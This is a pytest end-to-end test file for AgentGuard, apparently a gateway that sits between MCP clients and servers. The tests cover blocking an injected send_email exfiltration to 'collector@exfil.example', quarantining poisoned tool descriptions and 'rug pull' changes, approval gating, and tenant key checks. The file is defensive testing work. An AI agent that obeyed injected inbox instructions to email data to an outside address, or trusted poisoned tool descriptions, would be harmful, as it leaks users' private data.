"""End-to-end: the official MCP client talks to real local MCP servers through the AgentGuard
gateway, over stdio and streamable HTTP."""

from __future__ import annotations

import json
import socket
import sys
import threading
import time
from collections.abc import Iterator
from pathlib import Path

import pytest

mcp = pytest.importorskip("mcp")
httpx2 = pytest.importorskip("httpx2")

from mcp import Client, StdioServerParameters  # noqa: E402
from mcp.client.streamable_http import streamable_http_client  # noqa: E402

ROOT = Path(__file__).resolve().parents[2]
SERVERS = ROOT / "tests" / "e2e" / "mcp_servers.py"

POLICY = """
tools:
  read_inbox: { role: source, risk: low }
  send_email: { role: sink, risk: high, destination_args: [to] }
  get_weather: { role: source, risk: low }
  multiply: { role: neutral, risk: low }
  add: { role: neutral, risk: low }
"""


def text_of(result) -> str:  # type: ignore[no-untyped-def]
    return "\n".join(c.text for c in result.content if getattr(c, "type", "") == "text")


@pytest.fixture
def workdir(tmp_path: Path) -> Path:
    (tmp_path / "policy.yaml").write_text(POLICY)
    return tmp_path


def stdio_params(
    workdir: Path, server: str, env: dict[str, str] | None = None, pins: str = "pins.json"
) -> StdioServerParameters:
    return StdioServerParameters(
        command=sys.executable,
        args=[
            "-m",
            "agentguard.cli",
            "gateway",
            "mcp-stdio",
            "--policy",
            str(workdir / "policy.yaml"),
            "--name",
            server,
            "--pins-file",
            str(workdir / pins),
            "--events-file",
            str(workdir / "events.jsonl"),
            "--",
            sys.executable,
            str(SERVERS),
            server,
        ],
        env={
            "AG_TEST_OUTBOX": str(workdir / "outbox.jsonl"),
            "AGENTGUARD_MODEL_DIR": str(workdir / "none"),
            "PYTHONPATH": str(ROOT / "src"),
            **(env or {}),
        },
        cwd=str(workdir),
    )


def events(workdir: Path) -> list[dict]:
    f = workdir / "events.jsonl"
    return [json.loads(x) for x in f.read_text().splitlines()] if f.exists() else []


async def test_stdio_blocks_injected_exfiltration(workdir: Path) -> None:
    async with Client(stdio_params(workdir, "mail")) as client:
        names = {t.name for t in (await client.list_tools()).tools}
        assert {"read_inbox", "send_email", "get_weather"} <= names
        inbox = await client.call_tool("read_inbox", {})
        assert "collector@exfil.example" in text_of(inbox)  # data still flows to the agent
        blocked = await client.call_tool(
            "send_email", {"to": "collector@exfil.example", "subject": "fwd", "body": "emails"}
        )
        assert blocked.is_error
        assert "AgentGuard blocked the call to 'send_email'" in text_of(blocked)
        ok = await client.call_tool("get_weather", {"city": "Oslo"})
        assert "sunny" in text_of(ok)
    assert not (workdir / "outbox.jsonl").exists()
    ev = [e for e in events(workdir) if e.get("type") == "tool_call" and e["tool"] == "send_email"]
    assert ev and ev[0]["action"] == "BLOCK"
    assert any("send_email.to derived from read_inbox()" in c for c in ev[0]["taint_chain"])


async def test_stdio_user_prompt_meta_allows_requested_recipient(workdir: Path) -> None:
    from mcp.types import CallToolRequest  # noqa: F401  (ensures types import works)

    async with Client(stdio_params(workdir, "mail")) as client:
        await client.call_tool("read_inbox", {})
        # Without the user's prompt the gateway cannot know finance@acme.com was requested by the user.
        res = await client.call_tool(
            "send_email",
            {"to": "finance@acme.com", "subject": "Q3", "body": "summary"},
            meta={"agentguard/user_prompt": "Do what my boss asks: send the Q3 summary to finance@acme.com"},
        )
    # An injection was seen in the inbox, so a high-risk send still requires approval -> no approver -> blocked.
    assert res.is_error
    assert "approval" in text_of(res)


async def test_stdio_poisoned_descriptions_and_rug_pull(workdir: Path) -> None:
    async with Client(stdio_params(workdir, "poisoned")) as client:
        tools = {t.name for t in (await client.list_tools()).tools}
        assert tools == {"add", "multiply"}  # random_fact removed
        r = await client.call_tool("random_fact", {"context": "x"})
        assert r.is_error and "quarantined" in text_of(r)
        assert text_of(await client.call_tool("multiply", {"a": 3, "b": 4})) == "12"
    # Same server later ships a changed multiply description -> rug pull detected via pins.
    async with Client(stdio_params(workdir, "poisoned", env={"AG_TEST_RUGPULL": "1"})) as client:
        tools = {t.name for t in (await client.list_tools()).tools}
        assert tools == {"add"}
        r = await client.call_tool("multiply", {"a": 3, "b": 4})
        assert r.is_error
    q = [e for e in events(workdir) if e.get("type") == "mcp_tool_quarantined"]
    assert {e["tool"] for e in q} == {"random_fact", "multiply"}
    assert any("rug pull" in e["reason"] for e in q)


# ---------------------------------------------------------------- streamable HTTP


def free_port() -> int:
    with socket.socket() as s:
        s.bind(("127.0.0.1", 0))
        return int(s.getsockname()[1])


class ServerThread:
    def __init__(self, app, port: int) -> None:  # type: ignore[no-untyped-def]
        import uvicorn

        self.server = uvicorn.Server(uvicorn.Config(app, host="127.0.0.1", port=port, log_level="warning"))
        self.thread = threading.Thread(target=self.server.run, daemon=True)

    def __enter__(self) -> ServerThread:
        self.thread.start()
        deadline = time.time() + 15
        while not self.server.started:
            if time.time() > deadline:
                raise RuntimeError("server did not start")
            time.sleep(0.05)
        return self

    def __exit__(self, *exc: object) -> None:
        self.server.should_exit = True
        self.thread.join(timeout=10)


@pytest.fixture
def http_stack(workdir: Path, monkeypatch: pytest.MonkeyPatch) -> Iterator[tuple[str, list[dict]]]:
    monkeypatch.setenv("AG_TEST_OUTBOX", str(workdir / "outbox.jsonl"))
    sys.path.insert(0, str(SERVERS.parent))
    import mcp_servers

    from agentguard.core.engine import Engine
    from agentguard.core.events import MemorySink
    from agentguard.core.policy.loader import parse_policy
    from agentguard.gateway.auth import StaticKeyAuth, hash_key
    from agentguard.gateway.mcp.http import McpHttpGateway, Upstream
    from agentguard.gateway.mcp.interceptor import McpInterceptor

    up_port, gw_port = free_port(), free_port()
    upstream_app = mcp_servers.mail_server().streamable_http_app()
    sink = MemorySink()
    engine = Engine(parse_policy(POLICY), sinks=[sink])
    gw = McpHttpGateway(
        [
            Upstream(
                "mail",
                f"http://127.0.0.1:{up_port}/mcp",
                interceptor=McpInterceptor(engine, server_name="mail"),
            )
        ],
        StaticKeyAuth({hash_key("ag_test_key_tenant_a"): {"tenant_id": "tenant-a"}}),
    )
    with ServerThread(upstream_app, up_port), ServerThread(gw.app(), gw_port):
        yield f"http://127.0.0.1:{gw_port}/servers/mail/mcp", sink.events


async def test_http_gateway_end_to_end(http_stack: tuple[str, list[dict]], workdir: Path) -> None:
    url, ev = http_stack
    http = httpx2.AsyncClient(headers={"x-agentguard-key": "ag_test_key_tenant_a", "x-agentguard-session": "conv-1"})
    async with Client(streamable_http_client(url, http_client=http)) as client:
        assert "send_email" in {t.name for t in (await client.list_tools()).tools}
        await client.call_tool("read_inbox", {})
        r = await client.call_tool("send_email", {"to": "collector@exfil.example", "subject": "x", "body": "y"})
        assert r.is_error and "AgentGuard blocked" in text_of(r)
    assert not (workdir / "outbox.jsonl").exists()
    calls = [e for e in ev if e.get("type") == "tool_call"]
    assert calls[-1]["tenant_id"] == "tenant-a" and calls[-1]["action"] == "BLOCK"


async def test_http_gateway_rejects_bad_key_and_isolates_tenants(http_stack: tuple[str, list[dict]]) -> None:
    import httpx

    url, _ = http_stack
    async with httpx.AsyncClient() as c:
        r = await c.post(
            url,
            json={"jsonrpc": "2.0", "id": 1, "method": "tools/list"},
            headers={"x-agentguard-key": "wrong"},
        )
        assert r.status_code == 401
        r = await c.post(url.replace("/mail/", "/nope/"), json={}, headers={"x-agentguard-key": "ag_test_key_tenant_a"})
        assert r.status_code == 404
